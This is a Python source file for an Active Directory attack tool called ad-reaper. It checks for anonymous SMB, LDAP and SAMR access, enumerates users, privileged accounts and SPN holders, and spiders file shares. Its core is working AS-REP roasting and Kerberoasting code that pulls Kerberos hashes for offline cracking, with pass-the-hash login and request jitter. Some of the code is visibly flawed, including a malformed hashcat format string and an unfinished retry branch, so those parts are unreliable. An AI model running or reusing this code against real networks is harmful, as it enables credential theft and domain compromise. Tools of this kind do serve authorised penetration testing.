#!/usr/bin/env python3

"""
ad-reaper.py: A comprehensive Active Directory enumeration tool.

This tool combines anonymous (null session) and authenticated enumeration techniques
to provide a broad overview of an Active Directory environment's security posture.

Default Mode (Anonymous):
Performs quick, multi-protocol enumeration targeting low-hanging fruit like
anonymous null sessions. It combines LDAP, SAMR, and SMB enumeration with
active vulnerability testing..

Authenticated Mode:
Leverages credentials to perform a deep-dive enumeration. It checks for accessible shares,
remote access pathways, and common AD misconfigurations.
"""

import sys
import argparse
import ipaddress
import socket
import datetime
import random
import time
import os
from binascii import hexlify, unhexlify
from pathlib import Path

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from impacket.dcerpc.v5 import samr, transport, dcomrt
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.ndr import NULL
from impacket.dcerpc.v5.samr import DCERPCException
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, AS_REP, TGS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive, KerberosError, getKerberosTGT, getKerberosTGS
from impacket.krb5.types import KerberosTime, Principal
from impacket.nmb import NetBIOSError
from impacket.smb3 import FILE_ATTRIBUTE_DIRECTORY
from impacket.smbconnection import SMBConnection, SessionError
from impacket.nt_errors import STATUS_LOGON_FAILURE, STATUS_ACCESS_DENIED, STATUS_USER_SESSION_DELETED

from ldap3 import Server, Connection, ANONYMOUS, NTLM, SUBTREE, BASE, ALL
from ldap3.core.exceptions import LDAPInvalidCredentialsResult, LDAPSocketOpenError

# ---- Colors ----

class Style:
    RESET   = '\033[0m'
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    CYAN    = '\033[96m'

def print_info(m):    print(f"[*] {m}")
def print_success(m): print(f"[+] {Style.GREEN}{m}{Style.RESET}")
def print_vuln(m):    print(f"[+] {Style.RED}{m}{Style.RESET}")
def print_error(m):   print(f"[!] {Style.YELLOW}{m}{Style.RESET}")
def print_fail(m):    print(f"[-] {Style.RED}{m}{Style.RESET}")
def print_secure(m):  print(f"[-] {Style.GREEN}{m}{Style.RESET}")

def print_section(title):
    print("\n" + "="*70)
    print(f" {title.upper()} ".center(70, "="))
    print("="*70 + "\n")

# ---- Helpers ----

def dn_to_dns(dn):
    """ Convert LDAP DN → DNS name properly """
    if not dn:
        return None
    parts = [p[3:] for p in dn.split(',') if p.startswith('DC=')]
    return '.'.join(parts).lower() if parts else None

def parse_identity(s):
    if '/' in s: return s.split('/', 1)
    if '\\' in s: return s.split('\\', 1)
    return '', s

def parse_hashes(h):
    try:
        lm, nt = h.split(':')
        if len(lm) == 32 and len(nt) == 32:
            return lm, nt
    except:
        pass
    print_error("Invalid hash format. Expected LM:NT")
    sys.exit(1)

def check_port(ip, port, timeout=2):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        return s.connect_ex((ip, port)) == 0

# ---- AS-REP Roasting ----

class GetUserNoPreAuth:
    """
    Helper class to perform AS-REP Roasting by requesting TGTs for users
    without pre-authentication.
    """
    def __init__(self, domain, kdc_ip=None, format='hashcat'):
        self.domain   = domain.upper()
        self.kdcIP    = kdc_ip
        self.format   = format

    def getTGT(self, username, requestPAC=False):
        clientName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        serverName = Principal(f'krbtgt/{self.domain}', type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        asReq = AS_REQ()
        asReq['pvno'] = 5
        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        pac = KERB_PA_PAC_REQUEST()
        pac['include-pac'] = requestPAC
        asReq['padata'] = noValue
        asReq['padata'][0] = noValue
        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq['padata'][0]['padata-value'] = encoder.encode(pac)

        reqBody = seq_set(asReq, 'req-body')

        opts = [constants.KDCOptions.forwardable.value, constants.KDCOptions.renewable.value, constants.KDCOptions.proxiable.value]
        reqBody['kdc-options'] = constants.encodeFlags(opts)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        seq_set(reqBody, 'cname', clientName.components_to_asn1)
        reqBody['realm'] = self.domain

        now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
        reqBody['till']  = KerberosTime.to_asn1(now)
        reqBody['rtime'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)

        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value))
        seq_set_iter(reqBody, 'etype', supportedCiphers)

        message = encoder.encode(asReq)

        try:
            r = sendReceive(message, self.domain, self.kdcIP)
            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
            etype = asRep['enc-part']['etype']
            cipher = asRep['enc-part']['cipher'].asOctets()

            if self.format == 'john':
                if etype in (17,18):
                    return f'$krb5asrep${etype}${username}@{self.domain}:{hexlify(cipher[:-12]).decode()}${hexlify(cipher[-12:]).decode()}'
                else:
                    return f'$krb5asrep${username}@{self.domain}:{hexlify(cipher[:16]).decode()}${hexlify(cipher[16:]).decode()}'
            else:  # hashcat
                if etype in (17,18):
                    return f'$krb5asrep${etype}${username}@${self.domain}:{hexlify(cipher[:-12]).decode()}${hexlify(cipher[-12:]).decode()}'
                else:
                    return f'$krb5asrep${etype}${username}@{self.domain}:{hexlify(cipher[:16]).decode()}${hexlify(cipher[16:]).decode()}'

        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                # Retry with AES only
                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value))
                seq_set_iter(reqBody, 'etype', supportedCiphers)
                message = encoder.encode(asReq)
                r = sendReceive(message, self.domain, self.kdcIP)
                asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
                # ... (repeat extraction)
            elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
                raise Exception("User does NOT have UF_DONT_REQUIRE_PREAUTH")
            else:
                raise
        except Exception as e:
            raise Exception(f'User {username} doesn\'t have UF_DONT_REQUIRE_PREAUTH set: {str(e)}')

# ---- Kerberoasting ----

class GetUserSPNs:
    """
    Helper class to perform Kerberoasting by requesting TGS tickets for
    service accounts (SPNs).
    """
    def __init__(self, username, password, domain, lmhash='', nthash='', kdc_ip=None, rc4_only=False, format='hashcat'):
        self.username = username
        self.password = password
        self.domain   = domain
        self.lmhash   = lmhash
        self.nthash   = nthash
        self.kdcIP    = kdc_ip
        self.rc4_only = rc4_only
        self.format   = format

        # Parse username like standalone
        if '\\' in username:
            self.user_domain, self.user = username.split('\\', 1)
        elif '@' in username:
            self.user, self.user_domain = username.split('@', 1)
        else:
            self.user = username
            self.user_domain = ''

        self.effective_domain = self.domain or self.user_domain or 'WORKGROUP'

    def getTGT(self):
        user_princ = Principal(self.user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        try:
            tgt, cipher, _, session_key = getKerberosTGT(
                user_princ,
                self.password,
                self.effective_domain,
                unhexlify(self.lmhash) if self.lmhash else b'',
                unhexlify(self.nthash) if self.nthash else b'',
                None,
                kdcHost=self.kdcIP
            )
            return {'tgt': tgt, 'cipher': cipher, 'sessionKey': session_key}
        except Exception as e:
            print_error(f"TGT request failed: {str(e).splitlines()[0]}")
            raise

    def roast(self, spn_users, output_dir=None, jitter=0, no_roast=False):
        if not spn_users:
            print_info("No SPN-owning users found for roasting")
            return

        if no_roast:
            print_info("Skipping roast (--no-roast). Roastable users:")
            for u in spn_users:
                print(f"  > {u}")
            return

        f = None
        if output_dir:
            hash_file = Path(output_dir) / "kerberoast_hashes.txt"
            f = open(hash_file, 'w')

        try:
            try:
                tgt_data = self.getTGT()
            except:
                print_error("Unable to obtain TGT — aborting Kerberoasting")
                return

            for user in spn_users:
                if jitter > 0:
                    time.sleep(random.uniform(0.3, jitter))

                try:
                    # Match standalone: NT_ENTERPRISE with just username as component
                    principal = Principal()
                    principal.type = constants.PrincipalNameType.NT_ENTERPRISE.value
                    principal.components = [user]

                    tgs, cipher, old_session_key, session_key = getKerberosTGS(
                        principal,
                        self.effective_domain,
                        self.kdcIP,
                        tgt_data['tgt'],
                        tgt_data['cipher'],
                        tgt_data['sessionKey']
                    )

                    decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
                    etype = decoded['ticket']['enc-part']['etype']
                    cipher_text = decoded['ticket']['enc-part']['cipher'].asOctets()

                    if etype == 23:
                        entry = f"$krb5tgs$23$*{user}${self.effective_domain.upper()}${self.effective_domain.upper()}/{user}*$" \
                                f"{hexlify(cipher_text[:16]).decode()}${hexlify(cipher_text[16:]).decode()}"
                    elif etype in (17, 18):
                        entry = f"$krb5tgs${etype}$*{user}${self.effective_domain.upper()}${self.effective_domain.upper()}/{user}*$" \
                                f"{hexlify(cipher_text[-12:]).decode()}${hexlify(cipher_text[:-12]).decode()}"
                    else:
                        print_error(f"Skipping unsupported etype {etype} for {user}")
                        continue

                    print_vuln(f"Kerberoast hash for {user}: {entry}")
                    if f: f.write(entry + '\n')

                except Exception as e:
                    print_error(f"Failed to roast {user}: {str(e).splitlines()[0]}")

            if f:
                print_success(f"Kerberoast hashes saved to {hash_file}")
        finally:
            if f: f.close()


# ---- Core enumeration functions ----

def check_smb_null_session(target_ip, spider_shares=False):
    """
    Checks for an SMB null session, lists shares, and enumerates files.
    Returns True if any potentially sensitive files are found, otherwise False.
    """
    found_sensitive_file = False
    SHARES_TO_SKIP = ('IPC$', 'PRINT$')
    SENSITIVE_EXTS = ('.xml', '.txt', '.ini', '.config', '.kdbx', '.toml', '.cfg', '.pdf')

    def list_smb_path(conn, share, path, max_depth=5, current_depth=0):  # Depth limit to prevent stack overflow
        if current_depth > max_depth:
            print_error(f"Max depth reached for {path} - skipping deeper recursion")
            return

        nonlocal found_sensitive_file
        r"""
        Recursively lists files and directories in a given path.
        'path' should be a directory, e.g., r'\' or r'\dir1\'
        """
        query_path = f"{path}*"
        try:
            files = conn.listPath(share, query_path)
            for f in files:
                filename = f.get_longname()
                is_dir = f.get_attributes() & FILE_ATTRIBUTE_DIRECTORY
                full_print_path = f"{path}{filename}"

                if filename in ('.', '..'):
                    continue

                if is_dir:
                    print(f"  > {Style.CYAN}{full_print_path}/{Style.RESET}")
                    list_smb_path(conn, share, f"{path}{filename}\\", max_depth, current_depth + 1)
                else:
                    if filename.lower().endswith(SENSITIVE_EXTS) or 'password' in filename.lower():
                        print_vuln(f"  > {full_print_path}  (SENSITIVE FILE)")
                        found_sensitive_file = True
                    else:
                        print(f"  > {full_print_path}")
        except SessionError as e:
            if e.getErrorCode() == STATUS_ACCESS_DENIED:
                print_error(f"  > {query_path} (Access Denied)")
            else:
                print_error(f"  > Error listing {query_path}: {e}")

    print_info("Checking for anonymous SMB login and share listing (port 445)...")
    for user in ['', '.', 'anonymous', 'guest']:  # Null session users
        conn = None
        try:
            conn = SMBConnection(target_ip, target_ip, timeout=5)
            conn.login(user, '')
            print_success(f"SUCCESS: Anonymous SMB login (user: '{user}') is ALLOWED!")

            shares = conn.listShares()
            print_info("Enumerating accessible shares...")

            print(f"  {Style.CYAN}{'Share Name':<20} {'Comment'}{Style.RESET}")
            print(f"  {'-'*20} {'-'*30}")
            for share in shares:
                print(f"  {share['shi1_netname'][:-1]:<20} {share['shi1_remark'][:-1]}")

            if spider_shares:
                for share in shares:
                    share_name = share['shi1_netname'][:-1]
                    if share_name in SHARES_TO_SKIP:
                        continue
                    print(f"\n--- Scanning Share: {Style.CYAN}{share_name}{Style.RESET} ---")
                    list_smb_path(conn, share_name, "\\")
            else:
                print_info("Recursive file discovery disabled (use --spider-shares to enable).")

            return found_sensitive_file

        except SessionError as e:
            if e.getErrorCode() == STATUS_ACCESS_DENIED:
                print_error(f"Login with user '{user}' OK, but share listing is DENIED. Trying next user...")
            elif e.getErrorCode() == STATUS_LOGON_FAILURE:
                pass
            else:
                print_error(f"SMB Error with user '{user}': {e}")
                break
        except (ConnectionRefusedError, NetBIOSError):
            print_error(f"Error connecting to SMB on {target_ip} (Connection refused or host not found)")
            return found_sensitive_file
        except Exception as e:
            print_error(f"An unexpected error occurred with SMB on {target_ip}: {e}")
            return found_sensitive_file
        finally:
            if conn:
                try:
                    conn.logoff()
                except SessionError as e:
                    # Ignore error if the session was already deleted by the server
                    if e.getErrorCode() != STATUS_USER_SESSION_DELETED:
                        raise
                except Exception:
                    pass

    print_fail("FAILED: Anonymous SMB login is NOT allowed or no user could list shares.")
    return found_sensitive_file

def query_ldap_anonymous(target_ip, output_dir=None):
    """
    Attempts to bind anonymously to LDAP to retrieve the default naming context,
    domain information, and enumerate users/SPNs if permitted.
    """
    print_info("Anonymous LDAP bind check...")
    server = Server(target_ip, get_info=ALL)
    conn = None
    domain_dn = None
    user_list = []
    spn_list = []

    try:
        conn = Connection(server, authentication=ANONYMOUS, auto_bind=True)
        print_success("Anonymous LDAP bind SUCCESS")

        conn.search('', '(objectClass=*)', BASE, attributes=['defaultNamingContext'])
        if not conn.entries:
            return None, [], []

        domain_dn = conn.entries[0].defaultNamingContext.value

        domain_attrs = [
            'defaultNamingContext', 'dnsHostName', 'serverName',
            'domainControllerFunctionality', 'forestFunctionality',
            'domainFunctionality', 'namingContexts'
        ]
        conn.search('', '(objectClass=*)', BASE, attributes=domain_attrs)

        if not conn.entries:
            print_error("Could not retrieve domain info from RootDSE.")
            return None, [], []

        domain_info = conn.entries[0]

        if 'defaultNamingContext' in domain_info:
            domain_dn = domain_info.defaultNamingContext.value
            print(f"  - {Style.CYAN}Domain DN:{Style.RESET} {domain_dn}")
        else:
            print_error("Could not retrieve defaultNamingContext. Aborting LDAP enum.")
            return None, [], []

        for attr in domain_attrs:
            if attr == 'defaultNamingContext':
                continue
            if attr in domain_info:
                value = domain_info[attr].value
                attr_formatted = ' '.join(word.capitalize() for word in attr.replace('Functionality', ' Func Level').split())
                if isinstance(value, list):
                    print(f"  - {Style.CYAN}{attr_formatted}:{Style.RESET}")
                    for item in value:
                        print(f"    - {item}")
                else:
                    print(f"  - {Style.CYAN}{attr_formatted}:{Style.RESET} {value}")

        raw_file = Path(output_dir) / "ldap_users_raw.txt" if output_dir else None
        if raw_file and raw_file.exists():
            print_info(f"Skipping LDAP user enum (Found {raw_file})")
            with open(raw_file, 'r') as f:
                for line in f:
                    parts = line.strip().split('|', 1)
                    if parts and parts[0].strip():
                        user_list.append(parts[0].strip())
        else:
            print_info("Querying for active, non-system user accounts...")
            real_users_filter = f'(&(objectClass=person)(!(objectClass=computer))(!(userAccountControl:1.2.840.113556.1.4.803:={UF_ACCOUNTDISABLE}))(!(sAMAccountName=HealthMailbox*)))'
            conn.search(domain_dn, real_users_filter, SUBTREE, attributes=['sAMAccountName', 'description'])

            if conn.entries:
                print_success("Found active users via LDAP:")
                print(f"{Style.YELLOW}{'Username':<25} {'Description'}{Style.RESET}")
                print(f"{'-'*25} {'-'*40}")
                
                f_raw = open(raw_file, 'w') if raw_file else None
                for entry in conn.entries:
                    username = entry.sAMAccountName.value
                    desc = entry.description.value or 'N/A'
                    if username:
                        user_list.append(username)
                        print(f"{Style.YELLOW}{username:<25}{Style.RESET} {desc}")
                        if f_raw: f_raw.write(f"{username} | {desc}\n")
                if f_raw: f_raw.close()

        print_info("Querying for users with Service Principal Names (SPNs)...")
        spn_filter = '(&(objectClass=user)(servicePrincipalName=*)(!(sAMAccountName=krbtgt)))'
        conn.search(domain_dn, spn_filter, SUBTREE, attributes=['sAMAccountName', 'servicePrincipalName'], paged_size=500)  # Paged for large DCs

        if conn.entries:
            print_vuln("Found users with SPNs (Potential Kerberoast Targets):")
            for entry in conn.entries:
                username = entry.sAMAccountName.value
                spns = entry.servicePrincipalName.value
                spn_display = spns[0] if isinstance(spns, list) else spns
                spn_list.append(spn_display)
                print(f"  > {Style.RED}{username:<25}{Style.RESET} SPN: {spn_display}...")

        else:
            print_secure("No users with SPNs found via anonymous LDAP.")

        print_info("Querying for high-value Server objects...")
        server_filter = '(&(objectClass=computer)(operatingSystem=*Server*))'
        conn.search(domain_dn, server_filter, SUBTREE, attributes=['sAMAccountName', 'operatingSystem', 'dNSHostName'], paged_size=500)
        if conn.entries:
            print_success("  Found Server Objects:")
            for entry in conn.entries:
                name = entry.sAMAccountName.value
                os = entry.operatingSystem.value or 'N/A'
                dns = entry.dNSHostName.value or 'N/A'
                print(f"    > {Style.CYAN}{name:<20}{Style.RESET} OS: {os} ({dns})")
        else:
            print_info("  No Server objects found.")

        conn.unbind()
        return domain_dn, user_list, spn_list

    except LDAPSocketOpenError:
        print_fail(f"LDAP connection failed on {target_ip}:389")
        return None, [], []
    except Exception as e:
        print_fail(f"Anonymous LDAP failed: {e}")
        return None, [], []
    
    except LDAPInvalidCredentialsResult:
        print_fail("FAILED: Anonymous LDAP bind is NOT allowed.")
    except (ConnectionRefusedError, LDAPSocketOpenError):
        print_error(f"Error connecting to LDAP on {target_ip} (Connection refused)")
    except Exception as e:
        print_error(f"An unexpected error occurred with LDAP on {target_ip}: {e}")
    finally:
        if conn:
            conn.unbind()

    return domain_dn, user_list, spn_list 

def enumerate_users_samr(target_ip, output_dir=None):
    """
    Enumerates non-junk domain users via the SAMR RPC interface.
    """
    raw_file = Path(output_dir) / "samr_users_raw.txt" if output_dir else None
    if raw_file and raw_file.exists():
        print_info(f"Skipping SAMR enum (Found {raw_file})")
        user_list = []
        with open(raw_file, 'r') as f:
            for line in f:
                parts = line.strip().split('|')
                if parts and parts[0].strip():
                    user_list.append(parts[0].strip())
        return user_list

    print_info("Enumerating all domain users via SAMR...")
    for user in ['', '.']:
        try:
            string_binding = r'ncacn_np:%s[\pipe\samr]' % target_ip
            rpc_transport = transport.DCERPCTransportFactory(string_binding)
            rpc_transport.set_dport(445)
            rpc_transport.set_credentials(user, '')
            rpc_transport.set_connect_timeout(5.0)

            print_info(f"Attempting SAMR enum with user: '{user}'")
            rpc_transport.connect()
            dce = rpc_transport.get_dce_rpc()
            dce.bind(samr.MSRPC_UUID_SAMR)

            resp = samr.hSamrConnect(dce, serverName=f'\\\\{target_ip}', desiredAccess=samr.MAXIMUM_ALLOWED)
            server_handle = resp['ServerHandle']

            resp = samr.hSamrEnumerateDomainsInSamServer(dce, server_handle)
            domain_name = next((d['Name'] for d in resp['Buffer']['Buffer'] if d['Name'] != 'Builtin'), None)

            if not domain_name:
                print_error("Could not find a non-Builtin domain via SAMR.")
                dce.disconnect()
                continue

            resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain_name)
            domain_sid = resp['DomainId']
            resp = samr.hSamrOpenDomain(dce, server_handle, desiredAccess=samr.MAXIMUM_ALLOWED, domainId=domain_sid)
            domain_handle = resp['DomainHandle']

            resp = samr.hSamrEnumerateUsersInDomain(dce, domain_handle)
            
            user_list = []
            JUNK_PREFIXES = ('$', 'SM_', 'HealthMailbox', 'DefaultAccount', 'Guest', 'Administrator', 'krbtgt')
            
            for user_info in resp['Buffer']['Buffer']:
                username = user_info['Name']
                rid = user_info['RelativeId']
                if not any(username.startswith(p) for p in JUNK_PREFIXES):
                    user_list.append((username, rid))

            dce.disconnect()
            print_success(f"SUCCESS: SAMR enumeration with user '{user}' is ALLOWED!")
            print_success(f"Found {len(user_list)} non-junk users via SAMR:")
            if user_list:
                if raw_file:
                    with open(raw_file, 'w') as f:
                        for username, rid in user_list:
                            f.write(f"{username} | {rid}\n")
                for username, rid in user_list:
                    print(f"{Style.YELLOW}{username:<25}{Style.RESET} (RID: {hex(rid)})")
                # Return only the usernames for the master list
                return [u for u, r in user_list]

        except (DCERPCException, SessionError) as e:
            if 'STATUS_ACCESS_DENIED' in str(e):
                print_error(f"Login with user '{user}' OK, but SAMR access is DENIED.")
                continue
            elif e.getErrorCode() != STATUS_LOGON_FAILURE:
                print_error(f"SMB Error during SAMR enum: {e}")
                return []
        except (ConnectionRefusedError, NetBIOSError):
            print_error(f"Error connecting to RPC/SAMR on {target_ip}")
            return []
        except Exception as e:
            print_error(f"An unexpected error occurred with SAMR enumeration: {e}")
            return []

    print_fail("FAILED: Anonymous SAMR enumeration is NOT allowed.")
    return []

def check_asrep_roastable_users(target_ip, domain_dn, user_list, format='hashcat', output_dir=None, no_roast=False, jitter=0):
    """Check and optionally roast AS-REP vulnerable users (clean output)"""
    domain = dn_to_dns(domain_dn)
    if not domain:
        print_error("No domain discovered — skipping AS-REP check")
        return []

    roaster = GetUserNoPreAuth(domain, target_ip, format)
    asrep_users = []

    if no_roast:
        print_info("Skipping actual TGT requests (--no-roast). Potentially roastable users:")
        for u in user_list:
            print(f"  > {u}")
        return user_list

    f = None
    if output_dir:
        hash_file = Path(output_dir) / 'asrep_hashes.txt'
        f = open(hash_file, 'w')

    try:
        for user in user_list:
            if jitter > 0:
                time.sleep(random.uniform(0.3, jitter))

            try:
                hash_val = roaster.getTGT(user)
                print_vuln(f"AS-REP roastable: {user} → {hash_val}")
                if f: f.write(hash_val + '\n')
                asrep_users.append(user)

            except Exception as e:
                err_str = str(e).lower()

                # Clean handling for the most common preauth-required case
                if "preauth required" in err_str or "uf_dont_require_preauth" in err_str:
                    print_error(f"AS-REP failed for {user}: User does NOT have UF_DONT_REQUIRE_PREAUTH set")
                elif "kdc_err" in err_str or "kerberoserror" in err_str:
                    print_error(f"AS-REP failed for {user}: KDC rejected request ({str(e).splitlines()[0]})")
                else:
                    # Fallback — show first line only, suppress the ASN.1 vomit
                    first_line = str(e).splitlines()[0] if str(e) else "Unknown error"
                    print_error(f"AS-REP failed for {user}: {first_line}")

    finally:
        if f: f.close()

    if asrep_users and output_dir:
        print_success(f"AS-REP hashes saved to {hash_file} ({len(asrep_users)} users)")
    else:
        print_info("No AS-REP roastable accounts found in this list")

    return asrep_users

def get_domain_from_ldap(target_ip):
    """
    Performs a quick anonymous LDAP query to get the domain name.
    Returns the NetBIOS domain name.
    """
    print_info(f"Attempting to discover domain name from {target_ip} via anonymous LDAP...")
    server = Server(target_ip, get_info=['defaultNamingContext'])
    conn = None
    try:
        conn = Connection(server, authentication=ANONYMOUS, auto_bind=True)  # noqa: F841
        if server.info and server.info.other.get('defaultNamingContext'):
            domain_dn = server.info.other['defaultNamingContext'][0]
            netbios_name = domain_dn.split(',')[0].replace('DC=', '').upper()
            print_success(f"  -> Discovered domain: {netbios_name}")
            return netbios_name
    except (LDAPSocketOpenError, ConnectionRefusedError):
        print_error(f"  -> Could not connect to LDAP on {target_ip} to auto-discover domain.")
    except Exception:
        pass # Fail silently if anonymous bind is not allowed
    return None

# ---- Authenticated Functions ----

def enumerate_smb_shares_auth(target_ip, domain, username, password, lmhash, nthash):
    """Connects to SMB with credentials and lists accessible shares."""
    print_section("Authenticated SMB Share Enumeration")
    try:
        conn = SMBConnection(target_ip, target_ip, timeout=5)
        conn.login(username, password, domain, lmhash=lmhash, nthash=nthash)
        print_success(f"SMB Auth Successful as {domain}\\{username}")

        shares = conn.listShares()
        print(f"  {Style.CYAN}{'Share Name':<20} {'Comment'}{Style.RESET}")
        print(f"  {'-'*20} {'-'*30}")
        
        discovered_shares = [s['shi1_netname'][:-1] for s in shares]
        for share_name in discovered_shares:
            # Find the corresponding remark for printing
            remark = next((s['shi1_remark'][:-1] for s in shares if s['shi1_netname'][:-1] == share_name), "")
            print(f"  {share_name:<20} {remark}")

        # After listing, check for read/write access on all discovered shares.
        print_info("\n  Checking for read/write access on discovered shares...")
        SHARES_TO_SKIP_CHECKS = ('IPC$', 'PRINT$')
        for share_name in discovered_shares:
            if share_name in SHARES_TO_SKIP_CHECKS:
                continue

            access_summary = []
            # Test for READ access
            try:
                conn.listPath(share_name, '\\*')
                access_summary.append(f"{Style.GREEN}READ{Style.RESET}")
            except SessionError:
                access_summary.append(f"{Style.RED}NO READ{Style.RESET}")

            # Test for WRITE access
            try:
                # Attempt to create and immediately delete a temporary file.
                temp_file = 'ad-reaper-test.tmp'
                tid, fid = conn.createFile(share_name, temp_file)
                conn.closeFile(tid, fid)
                conn.deleteFile(share_name, temp_file)
                access_summary.append(f"{Style.RED}WRITE{Style.RESET}")
            except SessionError:
                access_summary.append(f"{Style.RED}NO WRITE{Style.RESET}")
            
            print(f"    -> {share_name:<15} Access: [{', '.join(access_summary)}]")

        conn.logoff()
    except SessionError as e:
        if e.getErrorCode() == STATUS_LOGON_FAILURE:
            print_fail(f"SMB Login Failed: Invalid Credentials for {username}")
        else:
            print_fail(f"SMB Error: {e}")
    except Exception as e:
        print_fail(f"Connection Error: {e}")

def enumerate_ldap_auth(target_ip, domain, username, password, lmhash, nthash, output_dir=None):
    """
    Performs a comprehensive, authenticated LDAP enumeration.
    Returns the domain's search_base, a list of the user's groups, and a
    dictionary of findings (SPNs, admin users).
    """
    findings = {'spns': [], 'admin_users': []}
    print_section("Authenticated LDAP Enumeration")
    user_dn = f"{domain}\\{username}" if domain else username
    user_groups = []
    user_list = []
    search_base = None
    findings = {'spns': [], 'admin_users': []}

    try:
        server = Server(target_ip, get_info=ALL)
        auth_password = f"{lmhash}:{nthash}" if lmhash and nthash else password
        conn = Connection(server, user=user_dn, password=auth_password, authentication=NTLM, auto_bind=True)
        print_success(f"LDAP Bind Successful as {user_dn}")

        if server.info and server.info.other.get('defaultNamingContext'):
            search_base = server.info.other['defaultNamingContext'][0]
            print_info(f"Target Domain: {search_base}")
        else:
            print_fail("Could not determine DefaultNamingContext.")
            return None, [], findings, []

        print_info(f"Querying groups for user '{username}'...")
        conn.search(search_base, f'(sAMAccountName={username})', attributes=['memberOf', 'primaryGroupID'])
        if conn.entries:
            entry = conn.entries[0]
            primary_group_id = entry.primaryGroupID.value if 'primaryGroupID' in entry else None

            if 'memberOf' in entry:
                print(f"  {Style.YELLOW}Group Memberships:{Style.RESET}")
                for group in entry.memberOf:
                    cn = str(group).split(',')[0].replace('CN=', '').lower()
                    print(f"    - {cn}")
                    user_groups.append(cn)
            
            if primary_group_id:
                conn.search(search_base, f'(primaryGroupToken={primary_group_id})', attributes=['sAMAccountName'])
                if conn.entries:
                    primary_group_name = conn.entries[0].sAMAccountName.value.lower()
                    if primary_group_name not in user_groups:
                         print(f"    - {primary_group_name} (Primary Group)")
                         user_groups.append(primary_group_name)

        raw_file = Path(output_dir) / "ldap_users_raw.txt" if output_dir else None
        if raw_file and raw_file.exists():
            print_info(f"Skipping LDAP user enum (Found {raw_file})")
            with open(raw_file, 'r') as f:
                for line in f:
                    parts = line.strip().split('|', 1)
                    if parts and parts[0].strip():
                        user_list.append(parts[0].strip())
        else:
            print_info("Querying for active, non-system user accounts...")
            real_users_filter = f'(& (objectClass=person) (!(objectClass=computer)) (!(userAccountControl:1.2.840.113556.1.4.803:={UF_ACCOUNTDISABLE})) (!(sAMAccountName=HealthMailbox*)))'
            conn.search(search_base, real_users_filter, search_scope=SUBTREE, attributes=['sAMAccountName', 'description'], size_limit=0)
            if conn.entries:
                print(f"{Style.YELLOW}{'Username':<25} {'Description'}{Style.RESET}")
                print(f"{'-'*25} {'-'*40}")
                f_raw = open(raw_file, 'w') if raw_file else None
                for entry in conn.entries:
                    u_name = entry.sAMAccountName.value
                    desc = entry.description.value or 'N/A'
                    if u_name:
                        user_list.append(u_name)
                        print(f"{Style.YELLOW}{u_name:<25}{Style.RESET} {desc}")
                        if f_raw: f_raw.write(f"{u_name} | {desc}\n")
                if f_raw: f_raw.close()
            else:
                print_info("  No active users found with this filter.")

        print_info("Querying for high-value Server objects...")
        server_filter = '(&(objectClass=computer)(operatingSystem=*Server*))'
        conn.search(search_base, server_filter, search_scope=SUBTREE, attributes=['sAMAccountName', 'operatingSystem', 'dNSHostName'], size_limit=0)
        if conn.entries:
            print_success("  Found Server Objects:")
            for entry in conn.entries:
                name = entry.sAMAccountName.value
                os = entry.operatingSystem.value or 'N/A'
                dns = entry.dNSHostName.value or 'N/A'
                print(f"    > {Style.CYAN}{name:<20}{Style.RESET} OS: {os} ({dns})")
        else:
            print_info("  No Server objects found.")

        print_info("Scanning for Service Principal Names (SPNs)...")
        spn_filter = '(&(objectClass=user)(servicePrincipalName=*)(!(sAMAccountName=krbtgt)))'
        conn.search(search_base, spn_filter, attributes=['sAMAccountName', 'servicePrincipalName'])
        if conn.entries:
            print_success("  Found user accounts with SPNs (Potential Kerberoast Targets):")
            spn_users = []  # Collect users for roasting
            for entry in conn.entries:
                u = entry.sAMAccountName.value
                spn_val = entry.servicePrincipalName.value
                if isinstance(spn_val, list):
                    spn_val = spn_val[0]
                if not u.endswith('$'):
                    findings['spns'].append({'user': u, 'spn': spn_val})
                    spn_users.append(u)
                    print(f"    > {Style.YELLOW}{u:<20}{Style.RESET} (SPN: {spn_val})")
                else:
                    print(f"    > {Style.CYAN}{u:<20}{Style.RESET} (SPN: {spn_val}) [Machine Account]")
        else:
            print_secure("  No user accounts with SPNs found.")

        print_info("Querying for privileged accounts (adminCount=1)...")
        conn.search(search_base, '(&(objectClass=user)(adminCount=1))', attributes=['sAMAccountName'])
        if conn.entries:
            print_success("  -> Found accounts with adminCount=1 (High-Value Targets):")
            for entry in conn.entries:
                if 'sAMAccountName' in entry:
                    findings['admin_users'].append(entry.sAMAccountName.value)
                    print(f"    - {Style.YELLOW}{entry.sAMAccountName.value}{Style.RESET}")

        conn.unbind()
        return search_base, user_groups, findings, user_list

    except LDAPSocketOpenError:
        print_fail(f"Could not connect to LDAP port 389 on {target_ip}")
    except Exception as e:
        print_fail(f"LDAP Error: {e}")

